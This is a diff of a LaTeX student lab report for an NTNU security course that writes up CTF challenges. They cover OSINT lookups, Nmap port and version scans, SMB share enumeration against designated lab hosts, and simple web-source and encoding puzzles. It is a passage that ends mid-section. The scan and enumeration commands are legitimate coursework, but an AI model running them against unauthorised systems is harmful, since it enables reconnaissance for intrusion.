@@ -20,12 +20,13 @@
 \usepackage{graphicx}
 \usepackage{array}
 \usepackage{tabularx}
+\usepackage{xltabular} % longtable + X columns, so the summary table can break across pages
 \usepackage{enumitem}
 \usepackage{titlesec}
 \usepackage{fancyhdr}
 \usepackage{tocloft}
 \usepackage{draftwatermark}
-\usepackage{hyperref}
+\usepackage[hidelinks]{hyperref}
 \usepackage{ragged2e}
 \usepackage{float} % lets figures be pinned exactly where written, via [H]
 
@@ -79,8 +80,8 @@
     \textbf{Prepared On:}\\[0.4em]
     \textbf{03-Nov-26}\\[1.4em]
     \textbf{Prepared By:}\\[0.4em]
-    \textbf{<Name>}\\[0.2em]
-    \textbf{<Email>}
+    \textbf{Thor Tveito}\\[0.2em]
+    \textbf{thortve@ntnu.no}
 \end{center}
 \newpage
 
@@ -88,19 +89,8 @@
 % TABLE OF CONTENTS
 % =====================================================================
 \thispagestyle{plain}
-\section*{Contents}
-\addcontentsline{toc}{section}{Contents}
-\newlength{\tocnum}
-\setlength{\tocnum}{2.4em}
-\newcommand{\toclineone}[3]{\noindent\makebox[\tocnum][l]{#1}#2\ \dotfill\ #3\\[0.55em]}
-\newcommand{\toclinetwo}[3]{\noindent\hspace{1.6em}\makebox[\tocnum][l]{#1}#2\ \dotfill\ #3\\[0.55em]}
-
-\toclineone{1.}{Introduction}{1}
-\toclineone{2.}{Tasks Summary}{1}
-\toclineone{3.}{Home Tasks}{2}
-\toclinetwo{3.1}{Earth Book}{2}
-\toclinetwo{3.2}{Presentation}{3}
-\toclinetwo{3.3}{Rocky Apache Host}{4}
+\renewcommand{\contentsname}{Contents}
+\tableofcontents
 \newpage
 
 % =====================================================================
@@ -112,7 +102,7 @@
 
 \section{Tasks Summary}
 
-The following table highlights the tasks completed.
+The following table summarises the status of all tasks.
 
 \vspace{0.5em}
 \renewcommand{\arraystretch}{1.4}
@@ -124,33 +114,89 @@ The following table highlights the tasks completed.
 \cellcolor{partialorange}\textbf{Partially Completed} &
 \cellcolor{notcompletedred}\textcolor{white}{\textbf{Not Completed}} \\
 \hline
-\rowcolor{lightgray}\textbf{9} & 4 & 3 & 2 \\
+\rowcolor{lightgray}\textbf{32} & 28 & 0 & 4 \\
 \hline
 \end{tabularx}
 
 \vspace{1.2em}
 \renewcommand{\arraystretch}{1.5}
 \noindent
-\begin{tabularx}{\linewidth}{|>{\centering\arraybackslash}p{0.09\linewidth}|X|>{\centering\arraybackslash}p{0.20\linewidth}|}
+\begin{xltabular}{\linewidth}{|>{\centering\arraybackslash}p{0.09\linewidth}|X|>{\centering\arraybackslash}p{0.20\linewidth}|}
 \hline
 \rowcolor{headerblack}
 \textcolor{white}{\textbf{S.No.}} & \textcolor{white}{\textbf{Challenge}} & \textcolor{white}{\textbf{Status}} \\
 \hline
-1. &
-Earth Book - Somebody left an XLSX file on the NTNU domain; identify the file author's name.
-
-&
-\cellcolor{completedgreen}\textcolor{white}{Completed} \\
+\endfirsthead
 \hline
-2. &
-Presentation - A presentation document was left on stortinget.no; identify the email of the document creator.
-
-&
-\cellcolor{completedgreen}\textcolor{white}{Completed} \\
+\rowcolor{headerblack}
+\textcolor{white}{\textbf{S.No.}} & \textcolor{white}{\textbf{Challenge}} & \textcolor{white}{\textbf{Status}} \\
 \hline
-3. & \ldots\ldots\ldots\ldots\ldots & \cellcolor{completedgreen}\textcolor{white}{Completed} \\
+\endhead
+1. & Earth Book & \cellcolor{completedgreen}\textcolor{white}{Completed} \\
 \hline
-\end{tabularx}
+2. & Presentation & \cellcolor{completedgreen}\textcolor{white}{Completed} \\
+\hline
+3. & Linkedin Hacker & \cellcolor{completedgreen}\textcolor{white}{Completed} \\
+\hline
+4. & Bazaar In Bergen & \cellcolor{completedgreen}\textcolor{white}{Completed} \\
+\hline
+5. & Rocky Apache Host & \cellcolor{completedgreen}\textcolor{white}{Completed} \\
+\hline
+6. & Behind CloudFlare & \cellcolor{completedgreen}\textcolor{white}{Completed} \\
+\hline
+7. & Sharing is not Caring & \cellcolor{completedgreen}\textcolor{white}{Completed} \\
+\hline
+8. & Finding routes & \cellcolor{completedgreen}\textcolor{white}{Completed} \\
+\hline
+9. & Finding SSH & \cellcolor{completedgreen}\textcolor{white}{Completed} \\
+\hline
+10. & CUPS & \cellcolor{completedgreen}\textcolor{white}{Completed} \\
+\hline
+11. & SMB Enumeration & \cellcolor{completedgreen}\textcolor{white}{Completed} \\
+\hline
+12. & Relying on Internet Chat & \cellcolor{notcompletedred}\textcolor{white}{Not Attempted} \\
+\hline
+13. & Source Inspection & \cellcolor{completedgreen}\textcolor{white}{Completed} \\
+\hline
+14. & Encoded Secret & \cellcolor{completedgreen}\textcolor{white}{Completed} \\
+\hline
+15. & Protocol Forensics & \cellcolor{completedgreen}\textcolor{white}{Completed} \\
+\hline
+16. & Authentication Bypass & \cellcolor{completedgreen}\textcolor{white}{Completed} \\
+\hline
+17. & Object Traversal (IDOR) & \cellcolor{completedgreen}\textcolor{white}{Completed} \\
+\hline
+18. & Session Analysis & \cellcolor{notcompletedred}\textcolor{white}{Not Attempted} \\
+\hline
+19. & Script Injection (Stored XSS) & \cellcolor{completedgreen}\textcolor{white}{Completed} \\
+\hline
+20. & Request Forgery (CSRF) & \cellcolor{completedgreen}\textcolor{white}{Completed} \\
+\hline
+21. & SQL Injection & \cellcolor{completedgreen}\textcolor{white}{Completed} \\
+\hline
+22. & Server-Side Request Forgery (SSRF) & \cellcolor{completedgreen}\textcolor{white}{Completed} \\
+\hline
+23. & Path Traversal & \cellcolor{completedgreen}\textcolor{white}{Completed} \\
+\hline
+24. & XXE Injection & \cellcolor{completedgreen}\textcolor{white}{Completed} \\
+\hline
+25. & Caesar's Column & \cellcolor{completedgreen}\textcolor{white}{Completed} \\
+\hline
+26. & Rock You Like a Hash Cat & \cellcolor{completedgreen}\textcolor{white}{Completed} \\
+\hline
+27. & Tiny Primes, Big Problems & \cellcolor{completedgreen}\textcolor{white}{Completed} \\
+\hline
+28. & Clockwork Key & \cellcolor{completedgreen}\textcolor{white}{Completed} \\
+\hline
+29. & Patch-The-Box & \cellcolor{notcompletedred}\textcolor{white}{Not Attempted} \\
+\hline
+30. & Exploit Developer 1 & \cellcolor{completedgreen}\textcolor{white}{Completed} \\
+\hline
+31. & Exploit Developer 2 & \cellcolor{completedgreen}\textcolor{white}{Completed} \\
+\hline
+32. & Open-Box & \cellcolor{notcompletedred}\textcolor{white}{Not Attempted} \\
+\hline
+\end{xltabular}
 
 \newpage
 
@@ -345,6 +391,49 @@ Presentation - A presentation document was left on stortinget.no; identify the e
 \textbf{Flag\{Jørgen\}}
 \end{quote}
 
+\subsection{Bazaar In Bergen}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Description}
+\end{itemize}
+\noindent The University of Bergen (UiB) left a ``bazaar'' publicly exposed somewhere on its domain. The objective was to locate it and report the full website address including the directory, using only open-source (OSINT) search techniques.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Search Method}
+\end{itemize}
+\noindent A Google dork was used to restrict results to the UiB domain and its subdomains, combined with the keyword from the challenge text:
+
+\begin{quote}
+\texttt{site:uib.no bazaar}
+\end{quote}
+
+\noindent \texttt{site:uib.no} restricts the search to any UiB subdomain, while \texttt{bazaar} matches pages mentioning the keyword. The query returned a single relevant result, as seen in the figure below:
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.85\linewidth]{media/bazaar_query.png}
+    \caption{Search results for \texttt{site:uib.no bazaar}}
+    \label{fig:bazaar-query}
+\end{figure}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Findings}
+\end{itemize}
+\noindent The result is titled \emph{``Index of /bazaar''} and is hosted on the subdomain \texttt{nongnu.uib.no}. It is an open directory listing, where the web server displays the contents of the folder instead of a regular web page. The search snippet shows that the directory contains release archives of the Bazaar version control system, such as \texttt{bazaar-0.99.0.tar.bz2} dated 2004-02-05, together with their signature files. The ``bazaar'' in the challenge is therefore this forgotten directory, located at:
+
+\begin{quote}
+\texttt{https://nongnu.uib.no/bazaar/}
+\end{quote}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Flag}
+\end{itemize}
+\noindent Giving the full website address with the directory and without \texttt{https://}, per the required flag format:
+
+\begin{quote}
+\textbf{FLAG\{nongnu.uib.no/bazaar/\}}
+\end{quote}
+
 \subsection{Rocky Apache Host}
 
 \begin{itemize}[leftmargin=1.5em]
@@ -365,11 +454,11 @@ Presentation - A presentation document was left on stortinget.no; identify the e
 
 \noindent This approach relies on already collected scan data from search engines, which keeps the method passive.
 
-\begin{figure}
+\begin{figure}[H]
     \centering
-    \includegraphics[width=1\linewidth]{shodan_rocky.png}
-    \caption{Enter Caption}
-    \label{fig:placeholder}
+    \includegraphics[width=0.95\linewidth]{shodan_rocky.png}
+    \caption{Passive search results for an \texttt{Apache 2.4.37} host on Rocky Linux in \texttt{129.241.0.0/15}}
+    \label{fig:rocky-apache-passive}
 \end{figure}
 
 \begin{itemize}[leftmargin=1.5em]
@@ -379,5 +468,1404 @@ Presentation - A presentation document was left on stortinget.no; identify the e
 \begin{quote}
 \textbf{FLAG\{129.241.106.95}\}
 \end{quote}
+
+\subsection{Behind CloudFlare}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Description}
+\end{itemize}
+\noindent The domain \texttt{statkraft.no} is protected by Cloudflare, which hides the address of the server behind it. The objective was to find the domain's IP history and identify the first name of the person who registered the most recent IP address, using only open-source (OSINT) search techniques.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Search Method}
+\end{itemize}
+\noindent Historical DNS databases keep the IP addresses a domain has pointed to over time, independently of Cloudflare. The \emph{IP History} tool on \texttt{viewdns.info} was used to look up \texttt{statkraft.no}, as seen in the figure below:
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.85\linewidth]{media/statkraft_ip_history.png}
+    \caption{ViewDNS.info IP history for \texttt{statkraft.no}}
+    \label{fig:statkraft-ip-history}
+\end{figure}
+
+\noindent The lookup returned three historical IP addresses. The most recent one is \texttt{217.114.94.2}, located in Sweden and owned by Optimizely AB, last seen on 2026-10-12.
+
+\noindent To find out who registered this address, it was looked up in the RIPE database, which holds the registration records for European IP ranges. The lookup was done from the command line through the RIPE REST API:
+
+\begin{verbatim}
+curl -s "https://rest.db.ripe.net/search.txt\
+?query-string=217.114.94.2&flags=no-filtering"
+\end{verbatim}
+
+\noindent \textbf{Use of AI:} I got help from an AI assistant (Claude) to create this \texttt{curl} command.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Findings}
+\end{itemize}
+\noindent The relevant part of the RIPE response is shown below:
+
+\begin{verbatim}
+inetnum:        217.114.88.1 - 217.114.95.255
+netname:        SE-EPISERVER-STOCKHOLM
+descr:          EPiServer Hosting SE
+country:        SE
+admin-c:        TA6484-RIPE
+tech-c:         TA6484-RIPE
+
+person:         Tony Andren
+address:        Episerver AB
+address:        SE-111 56 Stockholm
+nic-hdl:        TA6484-RIPE
+\end{verbatim}
+
+\noindent The address belongs to the range \texttt{217.114.88.1} to \texttt{217.114.95.255}, registered under the network name \texttt{SE-EPISERVER-STOCKHOLM}. Episerver is the former name of Optimizely, which matches the owner shown by ViewDNS. Both the administrative and technical contact of the range point to the handle \texttt{TA6484-RIPE}, which belongs to \textbf{Tony Andren} at Episerver AB.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Flag}
+\end{itemize}
+\noindent Taking the first name only, per the required flag format:
+
+\begin{quote}
+\textbf{FLAG\{Tony\}}
+\end{quote}
+
+\subsection{Sharing is not Caring}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Description}
+\end{itemize}
+\noindent The IP address \texttt{46.226.10.76} belongs to a shared hosting server. One of the Norwegian websites hosted on it was compromised in week 33. The objective was to identify the domain name of the compromised website, using only open-source (OSINT) search techniques.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Search Method}
+\end{itemize}
+\noindent A reverse IP lookup on \texttt{viewdns.info} showed that 2,515 domains are hosted on this server, most of them Norwegian. This is too many to check one by one, so the search was turned around: instead of starting from the list of domains, the public defacement archive Zone-H was searched for records tied to the IP address.
+
+\noindent Zone-H allows its archive to be filtered by IP address directly in the URL:
+
+\begin{quote}
+\texttt{zone-h.org/archive/ip=46.226.10.76}
+\end{quote}
+
+\noindent The result is seen in the figure below, with the URL used to filter by IP highlighted in green:
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.95\linewidth]{media/zoneh_ip_archive.png}
+    \caption{Zone-H archive filtered on the IP address \texttt{46.226.10.76}}
+    \label{fig:zoneh-ip-archive}
+\end{figure}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Findings}
+\end{itemize}
+\noindent Zone-H lists three defacement notifications for this IP address, all on Norwegian websites:
+
+\vspace{0.5em}
+\renewcommand{\arraystretch}{1.3}
+\noindent
+\begin{tabularx}{\linewidth}{|l|l|X|l|}
+\hline
+\rowcolor{lightgray}\textbf{Date} & \textbf{Notifier} & \textbf{Domain} & \textbf{Week} \\
+\hline
+2026-08-16 & CoupDeGrace & \texttt{ssk.no} & 33 \\
+\hline
+2026-08-09 & chinafans & \texttt{hrbusiness.no} & 32 \\
+\hline
+2026-08-09 & chinafans & \texttt{www.turoflow.no} & 32 \\
+\hline
+\end{tabularx}
+\vspace{0.5em}
+
+\noindent Week 33 of 2026 runs from Monday 10 August to Sunday 16 August, following the ISO week numbering used in Norway. Only the defacement of \texttt{ssk.no} on 16 August falls within that week, as the two others happened on 9 August, the last day of week 32. The compromised website is therefore \textbf{ssk.no}.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Flag}
+\end{itemize}
+\noindent Giving the domain name only, without \texttt{https://}, per the required flag format:
+
+\begin{quote}
+\textbf{FLAG\{ssk.no\}}
+\end{quote}
+
+\subsection{Finding routes}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Description}
+\end{itemize}
+\noindent The objective was to find the route that traffic takes from the IP address \texttt{154.192.15.243} in Islamabad to \texttt{ntnu.no}, and to report the full domain name of the second last hop on that route.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Search Method}
+\end{itemize}
+\noindent A traceroute run from my own machine only shows the route from Norway, so a vantage point inside the network in Islamabad was needed. RIPE Atlas is a public measurement platform with probes placed in networks all over the world, and its measurements, including traceroutes, are openly available.
+
+\noindent The IP address \texttt{154.192.15.243} belongs to the Pakistani provider Nayatel (AS23674), and RIPE Atlas has a probe in this network in Islamabad (probe 60223). The domain \texttt{ntnu.no} resolves to \texttt{129.241.160.102}, so the RIPE Atlas API was searched for existing traceroutes towards that address:
+
+\begin{verbatim}
+curl -s "https://atlas.ripe.net/api/v2/measurements/\
+?target_ip=129.241.160.102&type=traceroute"
+\end{verbatim}
+
+\noindent \textbf{Use of AI:} I got help from an AI assistant (Claude) to find the probe and to create this \texttt{curl} command.
+
+\noindent The search returned measurement 222137708, a one-off traceroute to \texttt{129.241.160.102} run from probe 60223 in AS23674, as seen in the figure below:
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.95\linewidth]{media/ntnu_route_measurement.png}
+    \caption{RIPE Atlas measurement 222137708, a traceroute to \texttt{129.241.160.102} from a probe in Pakistan}
+    \label{fig:ntnu-route-measurement}
+\end{figure}
+
+\noindent The probe's public address is \texttt{154.192.21.242}. This is not the exact address from the challenge, but it is in the same Nayatel network in Islamabad, and there is no probe in the exact address range.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Findings}
+\end{itemize}
+\noindent The traceroute reached \texttt{ntnu.no} in 31 hops. The route leaves Pakistan, enters the Nordic research network NORDUnet, continues through the Norwegian research network (\texttt{uninett.no}) from Kristiansand up to Trondheim, and ends inside NTNU's own network. The complete route is seen in the figure below, with the second last hop highlighted in green:
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.45\linewidth]{media/ntnu_route_hops.png}
+    \caption{Complete traceroute from the probe in Islamabad to \texttt{ntnu.no}}
+    \label{fig:ntnu-route-hops}
+\end{figure}
+
+\noindent The last hop, number 31, is the destination itself, \texttt{129.241.160.102} (\texttt{lvs160vip02.it.ntnu.no}). The second last hop, number 30, is \texttt{129.241.1.131}, which has the domain name \textbf{dc-gsw2.nettel.ntnu.no}. Hops 28 and 29 did not reply, which is common for routers that are set up not to answer traceroute probes, and does not affect the result.
+
+\noindent The domain name was verified with a reverse DNS lookup of the IP address:
+
+\begin{verbatim}
+$ dig +short -x 129.241.1.131
+dc-gsw2.nettel.ntnu.no.
+\end{verbatim}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Flag}
+\end{itemize}
+\noindent Giving the domain name only, per the required flag format:
+
+\begin{quote}
+\textbf{FLAG\{dc-gsw2.nettel.ntnu.no\}}
+\end{quote}
+
+\subsection{Finding SSH}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Description}
+\end{itemize}
+\noindent A list of 13 target hosts on the course lab network (\texttt{10.212.0.0/16}) was given. Some of them run an SSH service on a non-standard port (any port other than 22). The objective was to find the number of targets doing this and the SSH version they run. All scanning was done against the designated lab targets only.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Search Method}
+\end{itemize}
+\noindent The targets are on an internal network, so the scan was run from a Kali Linux machine connected to that network. Nmap was used to scan all 65535 TCP ports on every target, with service and version detection, so that an SSH service on an unusual port would not be missed:
+
+\begin{verbatim}
+sudo nmap -Pn -p- -sV -iL targets.txt -oN ssh_scan.txt
+\end{verbatim}
+
+\noindent \texttt{-p-} scans all ports, \texttt{-sV} identifies the service and version on each open port, \texttt{-Pn} skips host discovery, and \texttt{-iL targets.txt} reads the list of targets. The scan is shown running in the figure below:
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.85\linewidth]{media/nmap_command.png}
+    \caption{Running the Nmap port and version scan against the target list from Kali}
+    \label{fig:nmap-command}
+\end{figure}
+
+\noindent \textbf{Use of AI:} I got help from an AI assistant (Claude) to build the Nmap commands and to interpret the scan output.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Findings}
+\end{itemize}
+\noindent The 13 targets turned out to be two different kinds of host. Ten of them are ``Metasploitable 2'' boxes, which run SSH only on the standard port 22 (\texttt{OpenSSH 8.9p1}) and therefore do not count. The other three are ``Metasploitable 3'' boxes, which run SSH on \emph{two} ports: the standard port 22, and in addition a non-standard port \texttt{2222} running an older version, \texttt{OpenSSH 6.6.1p1}. These three hosts are:
+
+\begin{itemize}[leftmargin=2.2em]
+    \item \texttt{10.212.171.84} (msp3-3)
+    \item \texttt{10.212.175.27} (msp3-2)
+    \item \texttt{10.212.172.202} (msp3-1)
+\end{itemize}
+
+\noindent The relevant lines from the scan of one of these hosts (the other two are identical) are:
+
+\begin{verbatim}
+Nmap scan report for msp3-3 ... (10.212.171.84)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.17
+631/tcp  open  ipp     CUPS 1.7
+2222/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13
+\end{verbatim}
+
+\noindent So \textbf{3} targets run SSH on a non-standard port, all with version \texttt{OpenSSH 6.6.1p1}.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Flag}
+\end{itemize}
+\noindent Per the required flag format, the count of targets followed by the SSH version:
+
+\begin{quote}
+\textbf{FLAG\{3\_6.6.1p1\}}
+\end{quote}
+
+\subsection{CUPS}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Description}
+\end{itemize}
+\noindent The objective was to find the version of CUPS (the Common Unix Printing System) running in the same target IP range, and report it together with its port number.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Search Method}
+\end{itemize}
+\noindent CUPS was identified from the same full Nmap scan used in the previous task (section 3.9). CUPS serves the Internet Printing Protocol (IPP) on its default port \texttt{631}, and Nmap's version detection (\texttt{-sV}) reads the version straight from the service banner.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Findings}
+\end{itemize}
+\noindent CUPS was found on the same three Metasploitable 3 hosts (\texttt{10.212.171.84}, \texttt{10.212.175.27} and \texttt{10.212.172.202}), in every case on port \texttt{631} running version \texttt{1.7}:
+
+\begin{verbatim}
+631/tcp  open  ipp  CUPS 1.7
+\end{verbatim}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Flag}
+\end{itemize}
+\noindent Per the required flag format, the port number followed by the version:
+
+\begin{quote}
+\textbf{FLAG\{631\_1.7\}}
+\end{quote}
+
+\subsection{SMB Enumeration}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Description}
+\end{itemize}
+\noindent A computer that is not configured properly may allow read and write access to its shared network folders. The objective was to use active scanning to figure out which account is used to grant this access, on the same lab target range. All scanning was done against the designated lab targets only.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Search Method}
+\end{itemize}
+\noindent The SMB (Samba) service was already seen on ports 139/445 of every target in the earlier port scan (section 3.9). Three tools were used in turn, all from the Kali machine on the lab network, to enumerate the Samba shares and the account behind them.
+
+\noindent First, \texttt{smbclient} was used to list the shares on one of the hosts with an anonymous (null) session:
+
+\begin{verbatim}
+smbclient -L //10.212.171.84/ -N
+\end{verbatim}
+
+\noindent This revealed a \texttt{public} share (comment ``WWW'') alongside \texttt{print\$} and \texttt{IPC\$}. Next, \texttt{enum4linux} was used to enumerate the accounts on the host through RID cycling:
+
+\begin{verbatim}
+enum4linux -a 10.212.171.84
+\end{verbatim}
+
+\noindent Finally, Nmap's SMB scripts were used to list the shares together with their access level and, crucially, the account Nmap used to obtain that access:
+
+\begin{verbatim}
+sudo nmap -p 139,445 --script smb-enum-shares,smb-enum-users 10.212.171.84
+\end{verbatim}
+
+\noindent \textbf{Use of AI:} I got help from an AI assistant (Claude) to find the right commands and to interpret their output.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Findings}
+\end{itemize}
+\noindent The \texttt{smb-enum-shares} script reports an \texttt{account\_used} field, which names the account it used to access the shares. On the Metasploitable 3 hosts (\texttt{10.212.171.84}, \texttt{10.212.175.27} and \texttt{10.212.172.202}) this account was \texttt{guest}, and a share was accessible with read/write permissions:
+
+\begin{verbatim}
+| smb-enum-shares:
+|   account_used: guest
+|   \\10.212.171.84\IPC$:
+|     Comment: IPC Service (f993c5d463ff server (Samba, Ubuntu))
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+\end{verbatim}
+
+\noindent So although \texttt{enum4linux} showed the only real user account on the box to be \texttt{chewbacca}, the account that Samba actually uses to grant unauthenticated read/write access over the network is the \texttt{guest} account. The service is Samba, as confirmed by the server banner \texttt{server (Samba, Ubuntu)}.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Flag}
+\end{itemize}
+\noindent Per the required flag format, the account name followed by the service name:
+
+\begin{quote}
+\textbf{FLAG\{guest\_Samba\}}
+\end{quote}
+
+\subsection{Relying on Internet Chat}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Status}
+\end{itemize}
+\noindent \textbf{Not attempted.} This challenge was attempted but not completed. The IRC service (UnrealIRCd) was identified on port 6697 of the Metasploitable~3 hosts, but the required flag --- the port together with the summed number of users across the machines --- was not accepted, so the task was left unfinished.
+
+\subsection{Source Inspection}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Description}
+\end{itemize}
+\noindent This was a web challenge hosted at \texttt{http://challenges.iik3100-h26.iaas.iik.ntnu.no:4001/}. The objective was to locate data that is present in the page but not rendered on the visible page. The flag format was \texttt{IIK3100\{...\}}.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Search Method}
+\end{itemize}
+\noindent What a browser renders and what the server actually sends are not the same thing: HTML comments, CSS rules, inline scripts and off-screen elements are all delivered to the client but may never appear on screen. The raw page source for the challenge (\texttt{/challenge/1}) was therefore inspected directly, for example with the browser's ``View Source'' or with \texttt{curl}:
+
+\begin{verbatim}
+curl http://challenges.iik3100-h26.iaas.iik.ntnu.no:4001/challenge/1
+\end{verbatim}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Findings}
+\end{itemize}
+\noindent The source did not contain the flag as a single string. Instead it was split into three labelled parts, each hidden in a different place and surrounded by decoy values. The first two parts were in HTML and CSS comments, as seen in the figure below:
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.85\linewidth]{media/source_inspection_comments.png}
+    \caption{Flag fragments \texttt{part-a} and \texttt{part-b} hidden in HTML and CSS comments}
+    \label{fig:source-inspection-comments}
+\end{figure}
+
+\noindent The third part was stored in a hidden ``data layer'' --- a \texttt{<div>} positioned far off-screen (\texttt{left:-9999px}) and marked \texttt{aria-hidden}, so it never renders but is still sent to the browser:
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.85\linewidth]{media/source_inspection_datalayer.png}
+    \caption{Flag fragment \texttt{part-c} hidden in an off-screen, \texttt{aria-hidden} data layer}
+    \label{fig:source-inspection-datalayer}
+\end{figure}
+
+\noindent Collecting the three labelled fragments gives:
+
+\vspace{0.5em}
+\renewcommand{\arraystretch}{1.3}
+\noindent
+\begin{tabularx}{\linewidth}{|l|l|X|}
+\hline
+\rowcolor{lightgray}\textbf{Part} & \textbf{Where} & \textbf{Value} \\
+\hline
+part-a & HTML comment & \texttt{IIK3100\{HT} \\
+\hline
+part-b & CSS comment / inline script & \texttt{ML\_S0urc3\_1n} \\
+\hline
+part-c & off-screen data layer & \texttt{sp3ct10n\}} \\
+\hline
+\end{tabularx}
+\vspace{0.5em}
+
+\noindent Joining them in order spells out ``HTML Source Inspection'', which matches the challenge name and confirms it is the real flag. The other values in the source (such as \texttt{3rr0r\_n0t\_4\_fl4g} and several base64 strings) are decoys.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Flag}
+\end{itemize}
+\begin{quote}
+\textbf{IIK3100\{HTML\_S0urc3\_1nsp3ct10n\}}
+\end{quote}
+
+\subsection{Encoded Secret}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Description}
+\end{itemize}
+\noindent This was the second web challenge on the same server (\texttt{/challenge/2}). A value had been transformed or rotated before being stored, and the objective was to recover the original flag. The flag format was \texttt{IIK3100\{...\}}.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Search Method}
+\end{itemize}
+\noindent The page displayed a ``Service Configuration Export'' containing several tokens that were clearly encoded rather than plain text. One of them, \texttt{svc\_token}, was visually highlighted in the page, while the others were styled as ordinary strings:
+
+\begin{verbatim}
+build_token  = YnVpbGRfdG9rZW46djItc3RhZ2luZy0yMDI1
+legacy_token = L29lpSkuMT1cowcxnKAuLzkyMN==
+svc_token    = FHyYZmRjZUgPAUZmAwEsZKAsGwO0K0IhL3W5pUEcZT59   <-- highlighted
+checksum     = Y2hlY2tzdW06OWYzYTJiMWM0ZDVlNmY3MA==
+\end{verbatim}
+
+\noindent The other tokens decode straight from base64 into harmless decoy values (for example \texttt{build\_token} is base64 for \texttt{build\_token:v2-staging-2025}). The highlighted \texttt{svc\_token}, however, is not valid readable text when base64-decoded directly, which means it was transformed twice. The challenge hint names both steps: ``transformed \emph{or rotated}''. ``Rotated'' is the classic ROT13 cipher (rotate each letter by 13), and ``transformed/encoded for storage'' is base64. Applying the inverse of each, in order ROT13 first and then base64-decode, recovers the flag:
+
+\begin{verbatim}
+svc_token  = FHyYZmRjZUgPAUZmAwEsZKAsGwO0K0IhL3W5pUEcZT59
+  --ROT13-->  SUlLMzEwMHtCNHMzNjRfMXNfTjB0X0VuY3J5cHRpMG59
+  --base64->  IIK3100{B4s364_1s_N0t_Encrypti0n}
+\end{verbatim}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Findings}
+\end{itemize}
+\noindent The pairing is certain rather than a lucky guess, for several reasons:
+
+\begin{itemize}[leftmargin=2.2em]
+    \item The result is a valid, well-formed flag: printable ASCII, correctly delimited with \texttt{IIK3100\{...\}}, and readable leetspeak English (``Base64 is not encryption''). Every other ordering of the transforms on this token produced binary garbage.
+    \item The intermediate step is itself legitimate base64: after ROT13 the string becomes \texttt{SUlLMzEw...}, and \texttt{SUlL} is exactly how \texttt{IIK} base64-encodes. Two independent layers lining up like that rules out coincidence.
+    \item The flag's own text states the lesson of the challenge --- base64 is an encoding, not encryption --- which matches the challenge name and description.
+    \item \texttt{svc\_token} was the one token visually highlighted in the page source, pointing to it as the target among the decoys.
+\end{itemize}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Flag}
+\end{itemize}
+\begin{quote}
+\textbf{IIK3100\{B4s364\_1s\_N0t\_Encrypti0n\}}
+\end{quote}
+
+\subsection{Protocol Forensics}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Description}
+\end{itemize}
+\noindent This was the third web challenge on the same server (\texttt{/challenge/3}). The hint was that ``not everything lives in the response body'', and the objective was to find the flag. The flag format was \texttt{IIK3100\{...\}}.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Search Method}
+\end{itemize}
+\noindent An HTTP response consists of more than the HTML body: it also carries a set of response headers that the browser normally does not display. These were inspected using the browser's developer tools (Network tab \textrightarrow\ the request \textrightarrow\ Response Headers), as seen in the figure below. The same headers can be viewed from the command line with \texttt{curl -I}.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\linewidth]{media/protocol_forensics_headers.png}
+    \caption{The flag split across two custom HTTP response headers, shown in the browser's Network tab}
+    \label{fig:protocol-forensics-headers}
+\end{figure}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Findings}
+\end{itemize}
